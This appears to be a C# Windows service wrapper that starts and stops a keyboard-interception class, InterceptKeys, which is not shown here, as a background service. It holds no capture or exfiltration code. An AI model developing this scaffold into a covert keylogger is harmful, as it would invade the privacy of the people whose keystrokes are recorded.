using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace KeyboardListenerServicePrj
{
    public partial class KeyboardListenerService : ServiceBase
    {
        private InterceptKeys interceptKeys;
        public KeyboardListenerService()
        {
            InitializeComponent();
            interceptKeys = new InterceptKeys();
        }

        protected override void OnStart(string[] args)
        {
            
            interceptKeys.Start();
        }

        protected override void OnStop()
        {
            interceptKeys.Stop();
        }
    }
}
